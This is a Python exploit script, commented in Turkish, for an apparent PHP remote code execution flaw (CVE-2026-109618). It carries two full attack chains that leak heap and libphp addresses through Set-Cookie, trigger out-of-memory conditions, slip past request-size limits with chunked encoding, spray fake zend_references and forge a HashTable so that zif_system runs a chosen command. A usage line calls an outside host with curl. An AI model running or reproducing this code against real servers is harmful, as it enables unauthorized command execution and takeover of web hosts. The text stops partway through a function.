#!/usr/bin/env python3
"""php2shell tek-tık exploit (CVE-2026-109618) — hsyncomtr çift-zincir sürümü.

Tek dosyada iki adet tamamen bağımsız exploit zinciri:

  classic (display_errors=1, memory_limit=8M, en hızlısı)
    Aşama 0: HTTP üzerinden worker rotasyonu
    Aşama 1: Set-Cookie ile heap chunk taban sızıntısı (1001 alan + OOM)
    Aşama 2: 16 byte'lık cookie ile libphp taban sızıntısı (iç içe dizi düzeni)
    Aşama 3: 167 byte taşıyıcı sahte HashTable -> pDestructor=zif_system

  pure (display_errors=Off, memory_limit=32M..512M, gerçek üretim ayarları)
    A1: chunked Transfer-Encoding ile END-cleanup send_cookie OOM
        (iç içe boş dosya alanları + büyük değerler; post_max_size'ı atlar)
    B1: bayat-id 800KB OOB okuma -> TEK istekte chunk taban VE libphp taban
        (zval_ptr_dtor histogramı + 2MiB bucket kümeleme)
    A2: ucuz-OOM -> sarkan PS(http_session_vars)
    B2: sahte zend_reference spreyi + 384 byte sahte zend_array ->
        pDestructor=zif_system -> system(komut)   (komut 200 byte'a kadar)

pure zinciri, tam denemeler arasında hsyncomtr'ın HTTP worker rotasyonunu
(rotate()) korur; böylece çok-worker'lı prefork hedeflerde temiz heap
elde edilir — bu, orijinal 9bie zincirinin (docker restart) uzak hedefte
yapamadığı şeydir.

Kullanım:
  python3 poc_109618.py -u http://127.0.0.1:8088/index.php            # otomatik
  python3 poc_109618.py -u https://hedef/ -c 'curl http://BEN/x'      # pure
  python3 poc_109618.py -u http://hedef/ --chain pure --memory-limit 128
  python3 poc_109618.py -u http://hedef/ --probe-only

Uyarı: Yalnızca yetkili güvenlik testleri için kullanın. Worker çökmeleri
normaldir; prefork onları otomatik yeniden başlatır.
"""
from __future__ import annotations

import argparse
import os
import re
import socket
import ssl
import struct
import subprocess
import threading
import sys
import time
import urllib.parse
from collections import Counter

# ---------------------------------------------------------------------------
# classic-zincir offsetleri (lab derlemesi: PHP 8.4.26, Apache 2.4.68,
# Debian 12, gcc 12).  Bunlar libphp.so / Zend MM chunk tabanına göredir,
# yani ASLR'a bağlı değildir.  Yeniden derlemeler kaydırabilir;
# --zif/--dtor-offset ile elle geçilebilir.
# ---------------------------------------------------------------------------
ZIF_OFFSET = 0x43A870       # zif_system
DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR (zval_ptr_dtor)
HTDATA_OFFSET = 0x6E0D8     # sahte HashTable olarak kullanılan 167 byte'lık canlı string
MAX_CMD = 14                # 167 byte taşıyıcı - 0x98 başlık - NUL

# bookworm (resmi php:8.4.26-apache) kalibrasyonu, imaj üzerinde ölçüldü
BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_HTDATA_OFFSET = 0x690D8
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6

# ---------------------------------------------------------------------------
# pure-zincir offsetleri (resmi php:8.4.26-apache, Debian trixie araç zinciri,
# 128M, display_errors=Off — 9bie kalibrasyonundan türetildi).
# ---------------------------------------------------------------------------
PURE_ZDTOR_OFFSET = 0x65EB60   # libphp.so içinde zval_ptr_dtor
PURE_ZIF_OFFSET = 0x465370     # libphp.so içinde zif_system
PURE_S_OFFSET = 0xF8398        # ana chunk içindeki sahte-dizi S ofseti
PURE_HSV_OFFSET = 0x7D720      # PS(hash_serialize_verifier) (referans)
MAX_CMD_PURE = 0x160 - 0x98    # 384 byte taşıyıcı: 200 byte komut
PURE_MAIN_BUCKET_COUNT = 87    # sızıntı penceresindeki işaretçi parmak izi
PURE_DELTA_MIN, PURE_DELTA_MAX = 0x1A00000, 0x1F00000
PURE_FILLERS = 115             # ucuz-OOM dolgu alanları (8M/8.4.26 düzeni)

# A1, ayrıştırıcı OOM olmadan önce $_GET büyüsün diye sorgu dizisi taşır.
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"

# Hedef memory_limit'e göre OOM payload boyutlandırma (pure zincir A1).
OOM_CONFIGS = [
    {"limit_mb": 32, "big": 20, "parts": 300, "label": "32M"},
    {"limit_mb": 64, "big": 40, "parts": 500, "label": "64M"},
    {"limit_mb": 128, "big": 78, "parts": 860, "label": "128M (varsayılan)"},
    {"limit_mb": 256, "big": 156, "parts": 1200, "label": "256M"},
    {"limit_mb": 512, "big": 312, "parts": 1800, "label": "512M"},
]

# Sızıntı spec'leri: G:<sayfa>:<sayfa_no> sel değerleri, verisinin içine devasa
# bir zend_string başlığı yerleştirir; bayat id okuması A-dönemi heap artığını
# Set-Cookie içine taşırır.  fake_len, OOB okuma uzunluğudur.
LEAK_SPECS = {
    "big": {
        "spec": ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"]),
        "fake_len": 0xC8000,          # 800KB okuma
        "main_count": 87,
        "label": "800KB standart",
    },
    "small": {
        "spec": ",".join(["G:511:0x137"] * 6 + ["G:200:0x137", "G:511:0x137", "X:400"]),
        "fake_len": 0x40000,          # 256KB okuma
        "main_count": 40,
        "label": "256KB tutucu",
    },
    "micro": {
        "spec": ",".join(["G:511:0x137"] * 3 + ["G:100:0x137", "X:100"]),
        "fake_len": 0x20000,          # 128KB okuma (~6MB toplam gövde)
        "main_count": 20,
        "label": "128KB mikro (8MB limit)",
    },
    "nano": {
        "spec": ",".join(["G:200:0x137"] * 3 + ["X:50"]),
        "fake_len": 0x10000,          # 64KB okuma (~2.4MB toplam gövde)
        "main_count": 10,
        "label": "64KB nano (3MB limit)",
    },
}

SID = b"attacksessionid0001"
DEFAULT_CMD = "id>/out/p1"
_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PROOF = os.path.join(_HERE, "out", "p1")
DEFAULT_OFFSETS = os.path.join(_HERE, "out", "offsets.env")
PURE_BOUNDARY = b"C" * 10


def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def read_offsets_file(path: str) -> dict[str, int]:
    """docker/offsets.py tarafından yazılan ZIF_OFFSET=0x.. / DTOR_OFFSET=0x.. oku."""
    vals: dict[str, int] = {}
    if not path:
        return vals
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                vals[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return vals


class Target:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True,
                 insecure_tls: bool = False):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL http:// veya https:// olmalı")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose
        self.insecure_tls = insecure_tls

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    ctx = ssl.create_default_context()
                    if self.insecure_tls:
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None,
             path: str | None = None,
             chunked: bool = False,
             query: str = "") -> bytes:
        """Multipart gövdesi POST et.

        chunked=True gövdeyi Transfer-Encoding: chunked ile gönderir; bu,
        devasa OOM payloadlarını reddedecek post_max_size / LimitRequestBody
        kontrollerini atlatır.
        """
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        target_path = (path if path is not None else self.path) + query
        if chunked:
            hdr = (
                f"POST {target_path} HTTP/1.1\r\n"
                f"Host: {self.host}:{self.port}\r\n"
                f"{extra}"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).encode()
        else:
            hdr = (
                f"POST {target_path} HTTP/1.1\r\n"
                f"Host: {self.host}:{self.port}\r\n"
                f"{extra}"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Content-Length: {len(body)}\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)

        # Yüklemeyle eşzamanlı oku: bazı exploit istekleri worker'ı Set-Cookie
        # gönderir göndermez iptal ettirir; RST'ten sonra başlayan recv()
        # zaten tamponlanmış yanıtı kaybeder.
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                if chunked:
                    mv = memoryview(body)
                    for off in range(0, len(body), 65536):
                        piece = mv[off:off + 65536]
                        s.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
                    s.sendall(b"0\r\n\r\n")
                else:
                    mv = memoryview(body)
                    for off in range(0, len(body), 262144):
                        s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # worker, gövde hâlâ yolda iken iptal olabilir
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body

    def probe(self) -> dict:
        """Hedefin parmak izini al: sunucu banner'ı, PHP sürümü, mod_php ipucu."""
        info: dict = {"reachable": False}
        try:
            status, body = self.get(self.path, read_cap=65536)
            head = b""
            s = self._connect()
            s.settimeout(10)
            try:
                s.sendall((f"HEAD {self.path} HTTP/1.1\r\n"
                           f"Host: {self.host}:{self.port}\r\n"
                           "Connection: close\r\n\r\n").encode())
                data = bytearray()
                while len(data) < 65536:
                    d = s.recv(4096)
                    if not d:
                        break
                    data += d
                head = bytes(data)
            except OSError:
                pass
            finally:
                s.close()
            info["reachable"] = status != 0 or bool(head)
            text = (head + b"\r\n" + body).decode("latin1", "replace")
            info["status"] = status
            for line in text.split("\r\n"):
                ll = line.lower()
                if ll.startswith("server:"):
                    info["server"] = line.split(":", 1)[1].strip()
                if "x-powered-by" in ll and "php" in ll:
                    info["php"] = True
                    info["php_version"] = line.split(":", 1)[1].strip()
                if "phpsessid" in ll:
                    info["php"] = True
            srv = info.get("server", "").lower()
            info["likely_mod_php"] = ("apache" in srv or "httpd" in srv)
        except OSError as e:
            info["error"] = str(e)
        return info


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Aşama 1: çözülen cookie içindeki heap işaretçilerinin 2MB hizalı modu."""
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
    """Aşama 2: Set-Cookie verisi PS(id)+0x18'de başlar = nNextFreeElement|pDestructor.

    Sayfa hizalama kontrolü 4KB'dır, 2MB değil: lab derlemesinde libphp tesadüfen
    2MB sınırına eşlendi, ama resmi php:8.4.26-apache imajı 4KB sınırına eşler
    (örn. taban 0x...acdb000).
    """
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ---------------------------------------------------------------------------
# pure-zincir gövde üreticileri (9bie araştırma zincirinden portlandı, tamamı
# süreç içinde — exploit tek dosya olarak kalır)
# ---------------------------------------------------------------------------

def nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    if depth < 2:
        raise ValueError("derinlik >= 2 olmalı")
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def build_a1_body(parts: int = 860, depth: int = 64, key_pad: int = 90,
                  fillers128: int = 14, big: int = 78, big_len: int = 8000,
                  burners: int = 20, burner_len: int = 4000,
                  progress_len: int = 4000, sid_hex: str = "00",
                  boundary: bytes = PURE_BOUNDARY) -> bytes:
    """A1: END-cleanup send_cookie OOM (display_errors=Off uyumlu).

    İç içe derinlik-64 boş dosya alanları + bin-128 dolgular + büyük 8KB
    değerler rfc1867 ayrıştırıcısı içinde memory_limit'i tüketir.  OOM
    bailout'u modül kapanışını atlar ve send_cookie=1 ile sarkan PS(id) bırakır.
    """
    out = bytearray()

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None,
             ctype: bytes | None = None) -> None:
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", bytes.fromhex(sid_hex))
    for i in range(parts):
        is_mixed = i == 0
        is_mixed2 = i == 1
        ctype = b"C" * 103 if is_mixed else (b"C" * 231 if is_mixed2 else b"application/octet-stream")
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                   nest_name(i, depth, key_pad) + b"\"")
        if is_mixed or is_mixed2:
            out.extend(b"; filename=\"A\"")
        else:
            out.extend(b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(fillers128):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        part(("u%02d" % i).encode(), b"U" * burner_len)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out.extend(b"--" + boundary + b"--\r\n")
    return bytes(out)


def _tag8(idx: int, tagged: bool) -> bytes:
    if tagged:
        return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return b"BBBB/BBB"


def forge_fill_value(pages: int, page: int, fake_len: int, idx: int = 0,
                     tagged: bool = False) -> bytes:
    """G:<sayfa>:<sayfa_no> sel değeri: chunk sayfalarını 'A' ile doldur ve
    chunk+sayfa*0x1000 konumuna sahte interned zend_string başlığı yerleştir
    (len=fake_len); bayat id okuması chunk dışına A-dönemi heap artığı taşırsın."""
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= L:
        struct.pack_into("<I", v, hdr + 0x00, 0)             # refcount 0 -> serbest yok
        struct.pack_into("<I", v, hdr + 0x04, 0x16)          # IS_STRING|toplanamaz
        struct.pack_into("<Q", v, hdr + 0x08, 0)             # h
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)      # len -> OOB okuma boyu
        v[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def build_leak_body(spec: str, fake_len: int, sid: str = "a",
                    progress: str = "k0", name_len: int = 120,
                    boundary: bytes = PURE_BOUNDARY,
                    tagged: bool = True) -> bytes:
    """B1: çok aşamalı sızıntı gövdesi (sel forge değerleri + id-forge)."""
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + boundary +
                   b"\r\nContent-Disposition: form-data; name=\"" + name +
                   b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid.encode())
    has_p = any(it.partition(":")[0] == "P" for it in spec.replace(",", " ").split())
    if not has_p:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", progress.encode())

    idx = 0
    for item in spec.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            pages = int(arg, 0)
            part((b"f%04d" % idx).ljust(name_len, b"f")[:name_len],
                 (b"A" if kind == "F" else b"S") * (pages * 4096 - 25))
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            part((b"f%04d" % idx).ljust(name_len, b"f")[:name_len],
                 forge_fill_value(int(pages_s, 0), int(page_s, 0), fake_len, idx, tagged))
        elif kind == "X":
            for _ in range(int(arg, 0)):
                part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        else:
            raise ValueError("hatalı sızıntı spec öğesi %r" % item)
        idx += 1
    out.extend(b"--" + boundary + b"--\r\n")
    return bytes(out)


def build_cheap_oom_body(parts: int = 880, depth: int = 64, fillers: int = 115,
                         sid: bytes = b"a" * 32, progress: bytes = b"k0",
                         boundary: bytes = PURE_BOUNDARY) -> bytes:
    """A2: ucuz-OOM (yalnızca iç içe boş dosya alanları).

    Ayrıştırıcı, normal modül RINIT tamamlanmadan önce OOM olur; modül
    kapanışı atlanır ve worker chunk'ında sarkan PS(http_session_vars) kalır.
    Dolgular chunk içindeki sarkan referansı kaydırır (dolgu başına ~+0x80).
    """
    out = bytearray()

    def part(name: bytes, value: bytes = b"") -> None:
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        out.extend(b"--" + boundary +
                   b"\r\nContent-Disposition: form-data; name=\"" +
                   nest_name(i, depth) + b"\"" +
                   b"; filename=\"\"" +
                   b"\r\nContent-Type: application/octet-stream\r\n\r\n")
    out.extend(b"--" + boundary + b"--\r\n")
    return bytes(out)


def build_ht_384(htdata: int, zif: int, cmd: bytes) -> bytes:
    """B2 taşıyıcısı: sahte zend_array (pDestructor=zif_system); sahte
    execute_data S+0x20'de, komut string'i S+0x80'de — heap şekli (bin-448)
    tanılama spreyiyle eşleşsin diye 384 byte'a dolduruldu."""
    ht = bytearray(b"\x00" * 384)
    struct.pack_into("<II", ht, 0x00, 1, 7)               # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)   # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)       # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)               # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)               # nTableSize/pointer
    struct.pack_into("<Q", ht, 0x28, 0)                   # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                 # pDestructor = zif_system
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)               # opline
    struct.pack_into("<Q", ht, E + 0x08, 0)               # call
    struct.pack_into("<Q", ht, E + 0x10, zif)             # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)               # func
    struct.pack_into("<Q", ht, E + 0x20, 0)               # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)               # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)               # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)               # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)               # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)               # call_info
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)   # arg1 değeri
    struct.pack_into("<I", ht, E + 0x58, 6)               # arg1 IS_STRING
    struct.pack_into("<II", ht, 0x80, 1, 0x106)           # gc rc=1, IS_STRING
    struct.pack_into("<Q", ht, 0x88, 0)                   # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))            # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def make_spray(vl: int, ptr: int, rc: int, val_type: int,
               ref_start: int = 8, ref_step: int = 32) -> bytes:
    """Sprey değeri: vl-byte'lık alan değeri içinde her 32 byte'da bir sahte
    zend_reference; geri kazanılan yuva hangi bin'e düşerse düşsün, doğru
    hizada ptr=sahte-dizi referansı bulunur."""
    v = bytearray(b"S" * vl)
    o = ref_start
    while o + 32 <= vl:
        rv = bytearray(32)
        struct.pack_into("<I", rv, 0, rc)
        rv[4] = 0x0A                       # IS_REFERENCE
        struct.pack_into("<Q", rv, 8, ptr)
        struct.pack_into("<I", rv, 16, val_type)
        v[o:o + 32] = rv
        o += ref_step
    return bytes(v)


def build_fake_ref_body(vl: int, n1: int, n2: int, ptr: int, ht: bytes,
                        rc: int = 1, val_type: int = 0x0107, name_len: int = 10,
                        sid: bytes = b"a" * 32, progress: bytes = b"k0",
                        boundary: bytes = PURE_BOUNDARY) -> bytes:
    """B2: n1 sprey alanı, `ht` alanı, PHPSESSID/PROGRESS, n2 sprey."""
    spray = make_spray(vl, ptr, rc, val_type)

    def make_name(prefix: bytes, i: int) -> bytes:
        b = (prefix + ("%09d" % i).encode())
        return (b + b"x" * name_len)[:name_len]

    def part(name: bytes, value: bytes) -> bytes:
        return (b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")

    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", sid)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(n2):
        body += part(make_name(b"t", i), spray)
    body += b"--" + boundary + b"--\r\n"
    return bytes(body)


def parse_leak_pure(resp: bytes, zdtor_offset: int = PURE_ZDTOR_OFFSET,
                    main_count: int = PURE_MAIN_BUCKET_COUNT) -> dict | None:
    """B1 OOB sızıntısını çözümle: tek yanıt İKİ tabanı birden verir.

    - en yaygın heap işaretçisi == zval_ptr_dtor -> libphp tabanı
    - 2MiB hizalı bucket kümeleme; libphp ve baskın id-chunk bucket'ları
      çıkılır, main_count parmak izine göre sıralanır -> ana chunk tabanı
    """
    low = resp.lower()
    i = low.find(b"set-cookie: phpsessid=")
    if i < 0:
        return None
    line = resp[i:].split(b"\r\n")[0]
    eq = line.find(b"=")
    val = line[eq + 1:].split(b";")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    if len(dec) < 64:
        return None
    counts: Counter[int] = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= 0x7FFFFFFFFFFF:
            counts[q] += 1
    if not counts:
        return None
    zdtor, n = counts.most_common(1)[0]
    lib = zdtor - zdtor_offset
    buckets: Counter[int] = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common() if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - main_count), bc[1]))
    return {
        "decoded": len(dec),
        "zdtor": zdtor,
        "zdtor_count": n,
        "lib": lib,
        "buckets": buckets,
        "main_candidates": [b for b, c in cands[:3]],
    }


class Exploit:
    def __init__(self, target: Target, cmd: str, zif_offset: int = ZIF_OFFSET,
                 dtor_offset: int = DTOR_OFFSET, htdata_offset: int = HTDATA_OFFSET,
                 huge_mb: int = 12, verbose: bool = True, profile: str = "lab",
                 pure_zdtor: int = PURE_ZDTOR_OFFSET, pure_zif: int = PURE_ZIF_OFFSET,
                 pure_s_offset: int = PURE_S_OFFSET, insecure_tls: bool = False,
                 debug_http: bool = False):
        self.t = target
        self.cmd = cmd.encode()
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.debug_http = debug_http
        self.profile = profile
        # pure-zincir offsetleri
        self.pure_zdtor = pure_zdtor
        self.pure_zif = pure_zif
        self.pure_s_offset = pure_s_offset
        if profile == "bookworm":
            # resmi php:8.4.26-apache (Debian 12, Apache 2.4.69)
            self.stage1_n = BOOKWORM_STAGE1_N
            self.stage2_t = BOOKWORM_STAGE2_T
            self.stage2_v = BOOKWORM_STAGE2_V
            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
            self.stage3_carrier = True
        else:
            self.stage1_n = 892
            self.stage2_t = 443
            self.stage2_v = 1
            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            self.stage3_carrier = False

    # ---------- istek ilkeleri (biçimler tools/*.py ile eşleşir) ----------

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self) -> None:
        """Mevcut worker'ı HTTP üzerinden iptal et; prefork yenisini çatallar."""
        self.t.log("[*] worker HTTP üzerinden rotasyonlanıyor")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        # Dosya parçası olmayan, oturum başlatan B: RINIT öncesi temizlik
        # bozuk heap'te yürür ve çocuk süreç iptal olur.
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    # ---------------------------- classic zinciri ----------------------------

    def stage1(self) -> int:
        """Zend MM chunk tabanını sızdır."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # sahte zend_string len
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self) -> int:
        """56 byte'lık HashTable sayfası üzerinden libphp tabanını sızdır."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"komut {len(cmd)} byte; 167 byte'lık taşıyıcı en fazla {MAX_CMD} "
                f"byte izin verir (örn. 'sh</out/c' kullanın ya da 200 byte için "
                f"--chain pure deneyin)"
            )
        ht = bytearray(b"\x00" * 167)
        # sahte HashTable
        struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
